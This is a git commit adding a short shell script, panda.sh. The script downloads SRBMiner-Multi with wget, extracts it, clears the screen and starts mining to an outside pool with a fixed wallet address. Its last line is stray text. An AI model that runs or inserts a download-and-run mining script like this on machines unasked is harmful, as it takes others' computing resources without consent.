5368e8d797f5b9a568dc3d811993df8ae0209596
kilyotir <142836390+kilyotir@users.noreply.github.com>
2023-10-13 13:03:17 +0700

    Create panda.sh

---
+++ panda.sh
@@ -0,0 +1,6 @@
+wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.3.5/SRBMiner-Multi-2-3-5-Linux.tar.xz
+tar -xvf SRBMiner-Multi-2-3-5-Linux.tar.xz
+cd SRBMiner-Multi-2-3-5
+clear
+./SRBMiner-MULTI --algorithm pufferfish2bmb --pool stratum+tcp://bmb.ffmpool.com:4444 --wallet 00888A60971CA214AD6B94AEC5B5CC7DE5A06818247272554A
+dotaja
